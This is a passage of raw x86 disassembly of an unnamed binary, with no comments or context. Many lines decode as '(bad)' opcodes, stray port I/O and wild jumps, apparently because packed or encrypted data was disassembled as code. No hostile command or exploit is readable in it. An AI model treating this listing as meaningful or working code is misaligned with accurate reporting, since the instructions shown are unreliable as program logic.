  4037cc:	72 50                	jb     0x40381e
  4037ce:	46                   	inc    %esi
  4037cf:	d0 fb                	sar    %bl
  4037d1:	88 03                	mov    %al,(%ebx)
  4037d3:	a3 39 6a 3c 9c       	mov    %eax,0x9c3c6a39
  4037d8:	3c f8                	cmp    $0xf8,%al
  4037da:	79 26                	jns    0x403802
  4037dc:	c1 f6 eb             	shl    $0xeb,%esi
  4037df:	52                   	push   %edx
  4037e0:	b6 51                	mov    $0x51,%dh
  4037e2:	52                   	push   %edx
  4037e3:	d0 24 fc             	shlb   (%esp,%edi,8)
  4037e6:	77 99                	ja     0x403781
  4037e8:	ed                   	in     (%dx),%eax
  4037e9:	03 f3                	add    %ebx,%esi
  4037eb:	cf                   	iret
  4037ec:	8d 82 7a a3 39 5c    	lea    0x5c39a37a(%edx),%eax
  4037f2:	d6                   	(bad)
  4037f3:	8e f9                	mov    %ecx,%?
  4037f5:	43                   	inc    %ebx
  4037f6:	3e a3 fb 04 fd 9b    	mov    %eax,%ds:0x9bfd04fb
  4037fc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4037fd:	40                   	inc    %eax
  4037fe:	36 5b                	ss pop %ebx
  403800:	00 e9                	add    %ch,%cl
	...
  40382a:	00 00                	add    %al,(%eax)
  40382c:	3d 5b c7 24 26       	cmp    $0x2624c75b,%eax
  403831:	5b                   	pop    %ebx
  403832:	00 e9                	add    %ch,%cl
  403834:	3d d0 55 f1 c4       	cmp    $0xc4f155d0,%eax
  403839:	48                   	dec    %eax
  40383a:	8d ac 05 0b 6a e8 08 	lea    0x8e86a0b(%ebp,%eax,1),%ebp
  403841:	26 fc                	es cld
  403843:	46                   	inc    %esi
  403844:	6e                   	outsb  %ds:(%esi),(%dx)
  403845:	a3 ff b4 45 9c       	mov    %eax,0x9c45b4ff
  40384a:	52                   	push   %edx
  40384b:	dd f0                	(bad)
  40384d:	25 08 41 bc 9b       	and    $0x9bbc4108,%eax
  403852:	ff 26                	jmp    *(%esi)
  403854:	6d                   	insl   (%dx),%es:(%edi)
  403855:	d0 55 f1             	rclb   -0xf(%ebp)
  403858:	c4 48 6a             	les    0x6a(%eax),%ecx
  40385b:	e9 57 5b ff 94       	jmp    0x953f93b7
  403860:	c9                   	leave
  403861:	9b                   	fwait
  403862:	75 01                	jne    0x403865
  403864:	b0 25                	mov    $0x25,%al
  403866:	08 fe                	or     %bh,%dh
  403868:	0e                   	push   %cs
  403869:	47                   	inc    %edi
  40386a:	58                   	pop    %eax
  40386b:	62 0e                	bound  %ecx,(%esi)
  40386d:	a3 03 94 39 60       	mov    %eax,0x60399403
  403872:	d0 5f 98             	rcrb   -0x68(%edi)
  403875:	70 c0                	jo     0x403837
  403877:	b0 7c                	mov    $0x7c,%al
  403879:	52                   	push   %edx
  40387a:	00 91 3d 5b 00 e9    	add    %dl,-0x16ffa4c3(%ecx)
  403880:	74 98                	je     0x40381a
  403882:	08 e9                	or     %ch,%cl
  403884:	08 d0                	or     %dl,%al
  403886:	ec                   	in     (%dx),%al
  403887:	6a 7e                	push   $0x7e
  403889:	9e                   	sahf
  40388a:	50                   	push   %eax
  40388b:	11 da                	adc    %ebx,%edx
  40388d:	5f                   	pop    %edi
  40388e:	11 29                	adc    %ebp,(%ecx)
	...
  4038b8:	00 00                	add    %al,(%eax)
  4038ba:	3a a3 72 e8 7e 9b    	cmp    -0x6481178e(%ebx),%ah
  4038c0:	ff 14 2a             	call   *(%edx,%ebp,1)
  4038c3:	9c                   	pushf
  4038c4:	75 e1                	jne    0x4038a7
  4038c6:	55                   	push   %ebp
  4038c7:	26 ff 8e 4b 4f c0 00 	decl   %es:0xc04f4b(%esi)
  4038ce:	3a 9b c8 c2 23 5f    	cmp    0x5f23c2c8(%ebx),%bl
  4038d4:	8b 55 1f             	mov    0x1f(%ebp),%edx
  4038d7:	e4 12                	in     $0x12,%al
  4038d9:	8d 5a 93             	lea    -0x6d(%edx),%ebx
  4038dc:	50                   	push   %eax
  4038dd:	ff                   	(bad)
  4038de:	fa                   	cli
  4038df:	6e                   	outsb  %ds:(%esi),(%dx)
  4038e0:	ff 75 23             	push   0x23(%ebp)
  4038e3:	90                   	nop
  4038e4:	75 08                	jne    0x4038ee
  4038e6:	70 2d                	jo     0x403915
  4038e8:	0c 85                	or     $0x85,%al
  4038ea:	57                   	push   %edi
  4038eb:	17                   	pop    %ss
  4038ec:	13 8b aa 92 3b 45    	adc    0x453b92aa(%ebx),%ecx
  4038f2:	17                   	pop    %ss
  4038f3:	0a 07                	or     (%edi),%al
  4038f5:	b8 d6 5e 00 00       	mov    $0x5ed6,%eax
  4038fa:	7c 99                	jl     0x403895
  4038fc:	2a c0                	sub    %al,%al
  4038fe:	2c 5d                	sub    $0x5d,%al
  403900:	2b c0                	sub    %eax,%eax
  403902:	0e                   	push   %cs
  403903:	9d                   	popf
  403904:	0c 00                	or     $0x0,%al
  403906:	8a e3                	mov    %bl,%ah
  403908:	ec                   	in     (%dx),%al
  403909:	83 1b 93             	sbbl   $0xffffff93,(%ebx)
  40390c:	56                   	push   %esi
  40390d:	50                   	push   %eax
  40390e:	df 06                	filds  (%esi)
  403910:	93                   	xchg   %eax,%ebx
  403911:	11 e7                	adc    %esp,%edi
  403913:	5e                   	pop    %esi
  403914:	f8                   	clc
  403915:	72 96                	jb     0x4038ad
  403917:	9b                   	fwait
  403918:	ff 83 12 62 00 74    	incl   0x74006212(%ebx)
	...
  403946:	00 00                	add    %al,(%eax)
  403948:	a9 db 7d 08 a7       	test   $0xa7087ddb,%eax
  40394d:	09 07                	or     %eax,(%edi)
  40394f:	2b d7                	sub    %edi,%edx
  403951:	30 c9                	xor    %cl,%cl
  403953:	c2 63 5e             	ret    $0x5e63
  403956:	83 7d 97 5e          	cmpl   $0x5e,-0x69(%ebp)
  40395a:	75 0a                	jne    0x403966
  40395c:	bf 5d 00 00 57       	mov    $0x5700005d,%edi
  403961:	30 c9                	xor    %cl,%cl
  403963:	c2 83 5e             	ret    $0x5e83
  403966:	8b 75 53             	mov    0x53(%ebp),%esi
  403969:	d7                   	xlat   %ds:(%ebx)
  40396a:	45                   	inc    %ebp
  40396b:	fc                   	cld
  40396c:	67 5e                	addr16 pop %esi
  40396e:	00 00                	add    %al,(%eax)
  403970:	3e fd                	ds std
  403972:	4d                   	dec    %ebp
  403973:	08 b5 96 86 45 3a    	or     %dh,0x3a458696(%ebp)
  403979:	74 f5                	je     0x403970
  40397b:	75 4e                	jne    0x4039cb
  40397d:	72 f5                	jb     0x403974
  40397f:	75 36                	jne    0x4039b7
  403981:	11 51 10             	adc    %edx,0x10(%ecx)
  403984:	bb c3 7a 07 65       	mov    $0x65077ac3,%ebx
  403989:	44                   	inc    %esp
  40398a:	55                   	push   %ebp
  40398b:	c9                   	leave
  40398c:	fc                   	cld
  40398d:	87 03                	xchg   %eax,(%ebx)
  40398f:	83 8b 30 03 75 39 5d 	orl    $0x5d,0x39750330(%ebx)
  403996:	c4 5e 07             	les    0x7(%esi),%ebx
  403999:	46                   	inc    %esi
  40399a:	07                   	pop    %es
  40399b:	00 c5                	add    %al,%ch
  40399d:	be f7 03 ee 5a       	mov    $0x5aee03f7,%esi
  4039a2:	3f                   	aas
  4039a3:	10 6b 40             	adc    %ch,0x40(%ebx)
  4039a6:	bb 01 3e 84 03       	mov    $0x3843e01,%ebx
  4039ab:	5e                   	pop    %esi
	...
  4039d4:	00 00                	add    %al,(%eax)
  4039d6:	07                   	pop    %es
  4039d7:	46                   	inc    %esi
  4039d8:	07                   	pop    %es
  4039d9:	00 73 fd             	add    %dh,-0x3(%ebx)
  4039dc:	e6 81                	out    %al,$0x81
  4039de:	fa                   	cli
  4039df:	6b e4 ff             	imul   $0xffffffff,%esp,%esp
  4039e2:	b9 f3 5b 68 4a       	mov    $0x4a685bf3,%ecx
  4039e7:	b6 43                	mov    $0x43,%dh
  4039e9:	00 a6 15 02 c3 a1    	add    %ah,-0x5e3cfdeb(%esi)
  4039ef:	dd 03                	fldl   (%ebx)
  4039f1:	6a 3e                	push   $0x3e
  4039f3:	2e 07                	cs pop %es
  4039f5:	6a 3e                	push   $0x3e
  4039f7:	2e 07                	cs pop %es
  4039f9:	68 3e 84 03 80       	push   $0x8003843e
  4039fe:	81 2e fc e7 2d d3    	subl   $0xd32de7fc,(%esi)
  403a04:	04 00                	add    $0x0,%al
  403a06:	c7                   	(bad)
  403a07:	3e f0 40             	ds lock inc %eax
  403a0a:	f3 87 bc c2 36 84 5d 	xrelease xchg %edi,0x5d8436(%edx,%eax,8)
  403a11:	00 
  403a12:	cb                   	lret
  403a13:	5a                   	pop    %edx
  403a14:	2c ec                	sub    $0xec,%al
  403a16:	ee                   	out    %al,(%dx)
  403a17:	02 e9                	add    %cl,%ch
  403a19:	13 3e                	adc    (%esi),%edi
  403a1b:	5b                   	pop    %ebx
  403a1c:	64 89 46 89          	mov    %eax,%fs:-0x77(%esi)
  403a20:	8e f3                	mov    %ebx,%?
  403a22:	8e 98 fc ef 26 6f    	mov    0x6f26effc(%eax),%ds
  403a28:	78 04                	js     0x403a2e
  403a2a:	3e 64 a9 79 30 98 f4 	ds fs test $0xf4983079,%eax
  403a31:	ef                   	out    %eax,(%dx)
  403a32:	26 69 58 04 3e 44 29 	imul   $0xbd29443e,%es:0x4(%eax),%ebx
  403a39:	bd 
	...
  403a62:	00 00                	add    %al,(%eax)
  403a64:	fc                   	cld
  403a65:	63 e9                	arpl   %bp,%cx
  403a67:	f2 8b 93 5c 89 f6 88 	repnz mov -0x770976a4(%ebx),%edx
  403a6e:	46                   	inc    %esi
  403a6f:	f3 8e 98 b4 ff e1 66 	repz mov 0x66e1ffb4(%eax),%ds
  403a76:	36 f3 e1 dc          	ss repz loope 0x403a56
  403a7a:	ac                   	lods   %ds:(%esi),%al
  403a7b:	eb 3e                	jmp    0x403abb
  403a7d:	0e                   	push   %cs
  403a7e:	65 f3 4b             	gs repz dec %ebx
  403a81:	97                   	xchg   %eax,%edi
  403a82:	11 dd                	adc    %ebx,%ebp
  403a84:	ce                   	into
  403a85:	5b                   	pop    %ebx
  403a86:	e9 ab 3f 5b e9       	jmp    0xe99b7a36
  403a8b:	03 87 9d f1 03 0b    	add    0xb03f19d(%edi),%eax
  403a91:	e4 0d                	in     $0xd,%al
  403a93:	54                   	push   %esp
  403a94:	06                   	push   %es
  403a95:	03 50 16             	add    0x16(%eax),%edx
  403a98:	fe                   	(bad)
  403a99:	5a                   	pop    %edx
  403a9a:	f1                   	int1
  403a9b:	75 3f                	jne    0x403adc
  403a9d:	9c                   	pushf
  403a9e:	e6 5d                	out    %al,$0x5d
  403aa0:	3c 05                	cmp    $0x5,%al
  403aa2:	e9 f2 13 63 c1       	jmp    0xc1a34e99
  403aa7:	91                   	xchg   %eax,%ecx
  403aa8:	83 98 ce bc 7c 5f e9 	sbbl   $0xffffffe9,0x5f7cbcce(%eax)
  403aaf:	58                   	pop    %eax
  403ab0:	c5 87 19 4c d6 d2    	lds    -0x2d29b3e7(%edi),%eax
  403ab6:	00 db                	add    %bl,%bl
  403ab8:	fd                   	std
  403ab9:	5a                   	pop    %edx
  403aba:	f8                   	clc
  403abb:	3b 43 9c             	cmp    -0x64(%ebx),%eax
  403abe:	ff 13                	call   *(%ebx)
  403ac0:	3a 05 00 9e c6 62    	cmp    0x62c69e00,%al
  403ac6:	e8 16 00 00 00       	call   0x403ae1
	...
  403aef:	00 00                	add    %al,(%eax)
  403af1:	00 4f 98             	add    %cl,-0x68(%edi)
  403af4:	ff a0 03 5f 00 1c    	jmp    *0x1c005f03(%eax)
  403afa:	b1 87                	mov    $0x87,%cl
  403afc:	83 a5 15 2b 58 01 f0 	andl   $0xfffffff0,0x1582b15(%ebp)
  403b03:	6c                   	insb   (%dx),%es:(%edi)
  403b04:	40                   	inc    %eax
  403b05:	e9 25 0d 01 2a       	jmp    0x2a41482f
  403b0a:	0c 98                	or     $0x98,%al
  403b0c:	75 ed                	jne    0x403afb
  403b0e:	bc 1d f8 2e 76       	mov    $0x762ef81d,%esp
  403b13:	97                   	xchg   %eax,%edi
  403b14:	00 e9                	add    %ch,%cl
  403b16:	3d 5b 6a e9 ec       	cmp    $0xece96a5b,%eax
  403b1b:	0d 0c 3e 66 63       	or     $0x63663e0c,%eax
  403b20:	e8 a6 ee 97 ff       	call   0xffd829cb
  403b25:	62 76 63             	bound  %esi,0x63(%esi)
  403b28:	8b fb                	mov    %ebx,%edi
  403b2a:	cc                   	int3
  403b2b:	0d fc 1e 46 93       	or     $0x93461efc,%eax
  403b30:	ff 9c c5 98 52 f1 fa 	lcall  *-0x50ead68(%ebp,%eax,8)
  403b37:	9c                   	pushf
  403b38:	08 e9                	or     %ch,%cl
  403b3a:	16                   	push   %ss
  403b3b:	e4 ec                	in     $0xec,%al
  403b3d:	99                   	cltd
  403b3e:	f5                   	cmc
  403b3f:	02 18                	add    (%eax),%bl
  403b41:	da fd                	(bad)
  403b43:	5a                   	pop    %edx
  403b44:	f8                   	clc
  403b45:	7b 42                	jnp    0x403b89
  403b47:	9c                   	pushf
  403b48:	ff 53 3a             	call   *0x3a(%ebx)
  403b4b:	98                   	cwtl
  403b4c:	75 f1                	jne    0x403b3f
  403b4e:	65 c0 ff d6          	gs sar $0xd6,%bh
  403b52:	8f                   	(bad)
  403b53:	a1 c2 e5 00 00       	mov    0xe5c2,%eax
	...
  403b80:	3d 2e 8b 00 8b       	cmp    $0x8b008b2e,%eax
  403b85:	15 55 14 d4 48       	adc    $0x48d41455,%eax
  403b8a:	00 75 53             	add    %dh,0x53(%ebp)
  403b8d:	d4 c2                	aam    $0xc2
  403b8f:	10 67 8a             	adc    %ah,-0x76(%edi)
  403b92:	75 10                	jne    0x403ba4
  403b94:	98                   	cwtl
  403b95:	0f 0c                	(bad)
  403b97:	ff 32                	push   (%edx)
  403b99:	97                   	xchg   %eax,%edi
  403b9a:	e7 e6                	out    %eax,$0xe6
  403b9c:	aa                   	stos   %al,%es:(%edi)
  403b9d:	89 ff                	mov    %edi,%edi
  403b9f:	8b 72 73             	mov    0x73(%edx),%esi
  403ba2:	21 02                	and    %eax,(%edx)
  403ba4:	ee                   	out    %al,(%dx)
  403ba5:	9d                   	popf
  403ba6:	10 00                	adc    %al,(%eax)
  403ba8:	52                   	push   %edx
  403ba9:	18 ec                	sbb    %ch,%ah
  403bab:	83 d3 8b             	adc    $0xffffff8b,%ebx
  403bae:	ff 75 fb             	push   -0x5(%ebp)
  403bb1:	38 04 8d e2 86 50 ff 	cmp    %al,-0xaf791e(,%ecx,4)
  403bb8:	f2 92                	repnz xchg %eax,%edx
  403bba:	e7 c3                	out    %eax,$0xc3
  403bbc:	68 8c ff 8b a2       	push   $0xa28bff8c
  403bc1:	96                   	xchg   %eax,%esi
  403bc2:	82 38 e7             	cmpb   $0xe7,(%eax)
  403bc5:	0e                   	push   %cs
  403bc6:	07                   	pop    %es
  403bc7:	8b a2 86 0f c8 7c    	mov    0x7cc80f86(%edx),%esp
  403bcd:	5d                   	pop    %ebp
  403bce:	2b c0                	sub    %eax,%eax
  403bd0:	1e                   	push   %ds
  403bd1:	9d                   	popf
  403bd2:	08 00                	or     %al,(%eax)
  403bd4:	92                   	xchg   %eax,%edx
  403bd5:	17                   	pop    %ss
  403bd6:	ec                   	in     (%dx),%al
  403bd7:	83 23 8b             	andl   $0xffffff8b,(%ebx)
  403bda:	ff 75 db             	push   -0x25(%ebp)
  403bdd:	38 02                	cmp    %al,(%edx)
  403bdf:	8d                   	(bad)
  403be0:	e2 8c                	loop   0x403b6e
  403be2:	50                   	push   %eax
  403be3:	ff 00                	incl   (%eax)
	...
  403c0d:	00 32                	add    %dh,(%edx)
  403c0f:	92                   	xchg   %eax,%edx
  403c10:	e7 97                	out    %eax,$0x97
  403c12:	a8 8b                	test   $0x8b,%al
  403c14:	ff 8b d2 96 82 38    	decl   0x388296d2(%ebx)
  403c1a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403c1b:	0e                   	push   %cs
  403c1c:	08 0f                	or     %cl,(%edi)
  403c1e:	b0 1d                	mov    $0x1d,%al
  403c20:	fe 86 e3 b7 02 2b    	incb   0x2b02b7e3(%esi)
  403c26:	3e c4 ba c2 46 84 56 	les    %ds:0x568446c2(%edx),%edi
  403c2d:	8b 62 01             	mov    0x1(%edx),%esp
  403c30:	c7                   	(bad)
  403c31:	fc                   	cld
  403c32:	69 4f 00 6a 3f ff 45 	imul   $0x45ff3f6a,0x0(%edi),%ecx
  403c39:	ff                   	(bad)
  403c3a:	ee                   	out    %al,(%dx)
  403c3b:	c4 76 08             	les    0x8(%esi),%esi
  403c3e:	66 6a f1             	pushw  $0xfff1
  403c41:	ff 49 09             	decl   0x9(%ecx)
  403c44:	46                   	inc    %esi
  403c45:	0c bd                	or     $0xbd,%al
  403c47:	ac                   	lods   %ds:(%esi),%al
  403c48:	03 74 40 b5          	add    -0x4b(%eax,%eax,2),%esi
  403c4c:	b9 45 31 e9 05       	mov    $0x5e93145,%ecx
  403c51:	2b fe                	sub    %esi,%edi
  403c53:	ca c5 08             	lret   $0x8c5
  403c56:	3e 77 7d             	ja,pt  0x403cd6
  403c59:	ec                   	in     (%dx),%al
  403c5a:	c5 6e 14             	lds    0x14(%esi),%ebp
  403c5d:	83 54 84 76 04       	adcl   $0x4,0x76(%esp,%eax,4)
  403c62:	f7 41 ff ff 00 b7 ff 	testl  $0xffb700ff,-0x1(%ecx)
  403c69:	fe                   	(bad)
  403c6a:	73 7c                	jae    0x403ce8
  403c6c:	db d0                	fcmovnbe %st(0),%st
  403c6e:	f2 1c f0             	repnz sbb $0xf0,%al
  403c71:	0b 00                	or     (%eax),%eax
	...
  403c9b:	00 fe                	add    %bh,%dh
  403c9d:	ce                   	into
  403c9e:	fc                   	cld
  403c9f:	8a 8b b4 c8 02 3e    	mov    0x3e02c8b4(%ebx),%cl
  403ca5:	84 03                	test   %al,(%ebx)
  403ca7:	00 e5                	add    %ah,%ch
  403ca9:	8e 5d 01             	mov    0x1(%ebp),%ds
  403cac:	c9                   	leave
  403cad:	ee                   	out    %al,(%dx)
  403cae:	ff                   	(bad)
  403caf:	fe 4b 7c             	decb   0x7c(%ebx)
  403cb2:	db 3d ba 64 f0 c9    	fstpt  0xc9f064ba
  403cb8:	7c 8f                	jl     0x403c49
  403cba:	03 55 b5             	add    -0x4b(%ebp),%edx
  403cbd:	67 84 c4             	addr16 test %al,%ah
  403cc0:	a2 f5 7c 75 4a       	mov    %al,0x4a757cf5
  403cc5:	da 03                	fiaddl (%ebx)
  403cc7:	8d                   	(bad)
  403cc8:	fb                   	sti
  403cc9:	5a                   	pop    %edx
  403cca:	e5 54                	in     $0x54,%eax
  403ccc:	89 0f                	mov    %ecx,(%edi)
  403cce:	f9                   	stc
  403ccf:	55                   	push   %ebp
  403cd0:	81 0f e1 db 04 86    	orl    $0x8604dbe1,(%edi)
  403cd6:	e9 03 45 9b 3d       	jmp    0x3ddb81de
  403cdb:	06                   	push   %es
  403cdc:	bd 17 bd 04 eb       	mov    $0xeb04bd17,%ebp
  403ce1:	5d                   	pop    %ebp
  403ce2:	02 c4                	add    %ah,%al
  403ce4:	f8                   	clc
  403ce5:	a3 ab 00 3e e2       	mov    %eax,0xe23e00ab
  403cea:	2c f0                	sub    $0xf0,%al
  403cec:	3d 8b d0 48 2e       	cmp    $0x2e48d08b,%eax
  403cf1:	10 ba ac 3f 5b e9    	adc    %bh,-0x16a4c054(%edx)
  403cf7:	03 90 a2 ab 00 3e    	add    0x3e00aba2(%eax),%edx
  403cfd:	2e 72 e0             	jb,pn  0x403ce0
	...
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	bf 9f f1 ee 19       	mov    $0x19eef19f,%edi
  403d2f:	95                   	xchg   %eax,%ebp
  403d30:	1a 1b                	sbb    (%ebx),%bl
  403d32:	f5                   	cmc
  403d33:	01 e9                	add    %ebp,%ecx
  403d35:	59                   	pop    %ecx
  403d36:	3e 01 eb             	ds add %ebp,%ebx
  403d39:	59                   	pop    %ecx
  403d3a:	3e 01 ea             	ds add %ebp,%edx
  403d3d:	5b                   	pop    %ebx
  403d3e:	3e 5b                	ds pop %ebx
  403d40:	e9 c3 f1 0e f5       	jmp    0xf54f2f08
  403d45:	db ee                	fucomi %st(6),%st
  403d47:	85 e9                	test   %ebp,%ecx
  403d49:	03 b7 1e 35 44 52    	add    0x5244351e(%edi),%esi
  403d4f:	28 2e                	sub    %ch,(%esi)
  403d51:	79 46                	jns    0x403d99
  403d53:	83 d4 ed             	adc    $0xffffffed,%esp
  403d56:	c9                   	leave
  403d57:	94                   	xchg   %eax,%esp
  403d58:	26 49                	es dec %ecx
  403d5a:	c6                   	(bad)
  403d5b:	5b                   	pop    %ebx
  403d5c:	e9 03 3e e0 b4       	jmp    0xb5207b64
  403d61:	fb                   	sti
  403d62:	c4 69 74             	les    0x74(%ecx),%ebp
  403d65:	49                   	dec    %ecx
  403d66:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403d67:	2b 91 83 3e 5b 00    	sub    0x5b3e83(%ecx),%edx
  403d6d:	e9 be de 78 ee       	jmp    0xeeb91c30
  403d72:	a0 94 50 e6 06       	mov    0x6e65094,%al
  403d77:	63 ff                	arpl   %di,%di
  403d79:	3b 3e                	cmp    (%esi),%edi
  403d7b:	d8 7d d1             	fdivrs -0x2f(%ebp)
  403d7e:	3d 0e 03 2a 95       	cmp    $0x952a030e,%eax
  403d83:	73 ff                	jae    0x403d84
  403d85:	3c 5a                	cmp    $0x5a,%al
  403d87:	e6 85                	out    %al,$0x85
  403d89:	41                   	inc    %ecx
  403d8a:	51                   	push   %ecx
  403d8b:	94                   	xchg   %eax,%esp
  403d8c:	ff 19                	lcall  *(%ecx)
	...
  403db6:	00 00                	add    %al,(%eax)
  403db8:	69 0e fc c1 ea 93    	imul   $0x93eac1fc,(%esi),%ecx
  403dbe:	ff a6 44 d4 74 eb    	jmp    *-0x148b2bbc(%esi)
  403dc4:	64 d6                	fs (bad)
  403dc6:	ff 1c 2e             	lcall  *(%esi,%ebp,1)
  403dc9:	83 a3 7f 3d 5b 8b aa 	andl   $0xffffffaa,-0x74a4c281(%ebx)
  403dd0:	74 a2                	je     0x403d74
  403dd2:	c2 f1 3d             	ret    $0x3df1
  403dd5:	2e 8b 85 bc 9e f8 6e 	mov    %cs:0x6ef89ebc(%ebp),%eax
  403ddc:	96                   	xchg   %eax,%esi
  403ddd:	67 e8 89 14 94 ff    	addr16 call 0xffd4526c
  403de3:	70 76                	jo     0x403e5b
  403de5:	93                   	xchg   %eax,%ebx
  403de6:	c7                   	(bad)
  403de7:	ac                   	lods   %ds:(%esi),%al
  403de8:	e9 5a 00 e9 3d       	jmp    0x3e293e47
  403ded:	94                   	xchg   %eax,%esp
  403dee:	75 f5                	jne    0x403de5
  403df0:	05 d0 fd 3e d0       	add    $0xd03efdd0,%eax
  403df5:	df 55 e5             	fists  -0x1b(%ebp)
  403df8:	54                   	push   %esp
  403df9:	69 6a e9 77 5b ff 9c 	imul   $0x9cff5b77,-0x17(%edx),%ebp
  403e00:	d9 93 75 21 d0 0d    	fsts   0xdd02175(%ebx)
  403e06:	08 16                	or     %dl,(%esi)
  403e08:	36 67 ff             	ss addr16 (bad)
  403e0b:	bb 41 a2 c2 00       	mov    $0xc2a241,%ebx
  403e10:	af                   	scas   %es:(%edi),%eax
  403e11:	57                   	push   %edi
  403e12:	55                   	push   %ebp
  403e13:	8b 33                	mov    (%ebx),%esi
  403e15:	d9 c4                	fld    %st(4)
  403e17:	f8                   	clc
  403e18:	68 23 f8 00 00       	push   $0xf823
	...
  403e45:	00 a7 57 00 c7 5a    	add    %ah,0x5ac70057(%edi)
  403e4b:	8b 00                	mov    (%eax),%eax
  403e4d:	00 97 57 8b 55 5f    	add    %dl,0x5f558b57(%edi)
  403e53:	12 12                	adc    (%edx),%dl
  403e55:	8d 1a                	lea    (%edx),%ebx
  403e57:	87 50 6a             	xchg   %edx,0x6a(%eax)
  403e5a:	56                   	push   %esi
  403e5b:	86 75 fc             	xchg   %dh,-0x4(%ebp)
  403e5e:	a0 0b f8 ff 1a       	mov    0x1afff80b,%al
  403e63:	97                   	xchg   %eax,%edi
  403e64:	fe                   	(bad)
  403e65:	52                   	push   %edx
  403e66:	6b 12 45             	imul   $0x45,(%edx),%edx
  403e69:	f8                   	clc
  403e6a:	8e 98 04 00 0a 12    	mov    0x120a0004(%eax),%ds
  403e70:	ec                   	in     (%dx),%al
  403e71:	6a 26                	push   $0x26
  403e73:	12 45 0c             	adc    0xc(%ebp),%al
  403e76:	77 80                	ja     0x403df8
  403e78:	75 08                	jne    0x403e82
  403e7a:	cf                   	iret
  403e7b:	4c                   	dec    %esp
  403e7c:	fc                   	cld
  403e7d:	ff a0 d6 c2 08 27    	jmp    *0x2708c2d6(%eax)
  403e83:	2a 8b ec 3d 63 8d    	sub    -0x729cc214(%ebx),%cl
  403e89:	45                   	inc    %ebp
  403e8a:	13 2f                	adc    (%edi),%ebp
  403e8c:	ff 75 0f             	push   0xf(%ebp)
  403e8f:	b7 1e                	mov    $0x1e,%bh
  403e91:	fc                   	cld
  403e92:	90                   	nop
  403e93:	80 c9 c2             	or     $0xc2,%cl
  403e96:	df 5e 55             	fistps 0x55(%esi)
  403e99:	8b 93 dc 7d 0c d7    	mov    -0x28f38224(%ebx),%edx
  403e9f:	0a 14 83             	or     (%ebx,%eax,4),%dl
  403ea2:	92                   	xchg   %eax,%edx
  403ea3:	6e                   	outsb  %ds:(%esi),(%dx)
  403ea4:	00 74 f1 7f          	add    %dh,0x7f(%ecx,%esi,8)
  403ea8:	75 10                	jne    0x403eba
	...
  403ed2:	00 00                	add    %al,(%eax)
  403ed4:	20 0a                	and    %cl,(%edx)
  403ed6:	0c ff                	or     $0xff,%al
  403ed8:	aa                   	stos   %al,%es:(%edi)
  403ed9:	96                   	xchg   %eax,%esi
  403eda:	e7 fd                	out    %eax,$0xfd
  403edc:	3e 6d                	ds insl (%dx),%es:(%edi)
  403ede:	ed                   	in     (%dx),%eax
  403edf:	ff 87 46 00 00 13    	incl   0x13000046(%edi)
  403ee5:	0d e0 ff 2b b4       	or     $0xb42bffe0,%eax
  403eea:	ec                   	in     (%dx),%al
  403eeb:	75 46                	jne    0x403f33
  403eed:	5c                   	pop    %esp
  403eee:	b0 ff                	mov    $0xff,%al
  403ef0:	91                   	xchg   %eax,%ecx
  403ef1:	81 80 7d 2e 84 77 14 	addl   $0x2fbd14,0x77842e7d(%eax)
  403ef8:	bd 2f 00 
  403efb:	00 f2                	add    %dh,%dl
  403efd:	79 ec                	jns    0x403eeb
  403eff:	75 4e                	jne    0x403f4f
  403f01:	a1 76 0c 69 4f       	mov    0x4f690c76,%eax
  403f06:	fc                   	cld
  403f07:	e7 a9                	out    %eax,$0xa9
  403f09:	d1 ec                	shr    %esp
  403f0b:	ff 87 c6 ff ff ea    	incl   -0x1500003a(%edi)
  403f11:	fc                   	cld
  403f12:	de 83 cb 87 03 74    	fiadds 0x740387cb(%ebx)
  403f18:	34 f1                	xor    $0xf1,%al
  403f1a:	76 0c                	jbe    0x403f28
  403f1c:	26 36 de 00          	es fiadds %ss:(%eax)
  403f20:	3e dd 01             	fldl   %ds:(%ecx)
  403f23:	2b fe                	sub    %esi,%edi
  403f25:	73 ed                	jae    0x403f14
  403f27:	75 32                	jne    0x403f5b
  403f29:	11 76 08             	adc    %esi,0x8(%esi)
  403f2c:	26 55                	es push %ebp
  403f2e:	ec                   	in     (%dx),%al
  403f2f:	ff 11                	call   *(%ecx)
  403f31:	bb c1 08 3e cf       	mov    $0xcf3e08c1,%ebx
  403f36:	78 ec                	js     0x403f24
	...
  403f60:	00 00                	add    %al,(%eax)
  403f62:	01 a7 fb e7 21 29    	add    %esp,0x2921e7fb(%edi)
  403f68:	ec                   	in     (%dx),%al
  403f69:	ff 8e 9e fb 67 23    	decl   0x2367fb9e(%esi)
  403f6f:	cc                   	int3
  403f70:	42                   	inc    %edx
  403f71:	00 e1                	add    %ah,%cl
  403f73:	c6                   	(bad)
  403f74:	fb                   	sti
  403f75:	e7 4d                	out    %eax,$0x4d
  403f77:	49                   	dec    %ecx
  403f78:	ec                   	in     (%dx),%al
  403f79:	ff 64 84 ec          	jmp    *-0x14(%esp,%eax,4)
  403f7d:	75 36                	jne    0x403fb5
  403f7f:	5b                   	pop    %ebx
  403f80:	11 57 c1             	adc    %edx,-0x3f(%edi)
  403f83:	91                   	xchg   %eax,%ecx
  403f84:	1e                   	push   %ds
  403f85:	59                   	pop    %ecx
  403f86:	3c e0                	cmp    $0xe0,%al
  403f88:	ac                   	lods   %ds:(%esi),%al
  403f89:	ff 01                	incl   (%ecx)
  403f8b:	92                   	xchg   %eax,%edx
  403f8c:	94                   	xchg   %eax,%esp
  403f8d:	fb                   	sti
  403f8e:	a1 35 06 ec a1       	mov    0xa1ec0635,%eax
  403f93:	04 eb                	add    $0xeb,%al
  403f95:	7e 03                	jle    0x403f9a
  403f97:	6b 99 ec 0b 63 01 3e 	imul   $0x3e,0x1630bec(%ecx),%ebx
  403f9e:	89 91 e6 4c 77 9c    	mov    %edx,-0x6388b31a(%ecx)
  403fa4:	ed                   	in     (%dx),%eax
  403fa5:	03 13                	add    (%ebx),%edx
  403fa7:	e6 c5                	out    %al,$0xc5
  403fa9:	87 7a 8e             	xchg   %edi,-0x72(%edx)
  403fac:	ce                   	into
  403fad:	71 36                	jno    0x403fe5
  403faf:	83 19 ee             	sbbl   $0xffffffee,(%ecx)
  403fb2:	61                   	popa
  403fb3:	91                   	xchg   %eax,%ecx
  403fb4:	12 41 4a             	adc    0x4a(%ecx),%al
  403fb7:	e4 2c                	in     $0x2c,%al
